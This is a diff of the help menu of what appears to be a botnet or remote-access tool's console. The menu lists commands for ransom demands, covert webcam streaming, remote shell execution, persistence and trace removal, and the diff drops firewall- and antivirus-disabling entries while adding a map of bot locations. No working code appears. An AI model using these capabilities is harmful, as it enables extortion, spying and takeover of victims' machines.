@@ -8,16 +8,12 @@
           ║     ransom <price> <email> <btc>               ║     ransom $100 mail@mail.com BTC             ║  
           ║     webcam <ip> <port>                         ║     Stream webcam footage                     ║
           ║     shell <command>                            ║     Run shell commands                        ║
-          ║     whois <ip>                                 ║     Get info on IP Address                    ║
           ║     kill                                       ║     Stop client from listening                ║
           ║     persistence                                ║     Set persistence                           ║
-          ║     disablefirewall                            ║     Disable firewall                          ║
-          ║     disableantivirus                           ║     Disable antivirus                         ║
-          ║     disabletaskmanager                         ║     Disable taskmanager                       ║
           ║     selfdestruct                               ║     Remove all traces of the BotNet           ║
           ║     ping                                       ║     Ping all bots                             ║
-          ║     sysinfo                                    ║     Grab system info                          ║
           ║     list                                       ║     List online bots                          ║
+          ║     map                                        ║     View all bots general location on map     ║
           ║     clear                                      ║     Clear console                             ║
           ║     update                                     ║     Update client list                        ║
           ║     admincheck                                 ║     Check admin privileges                    ║
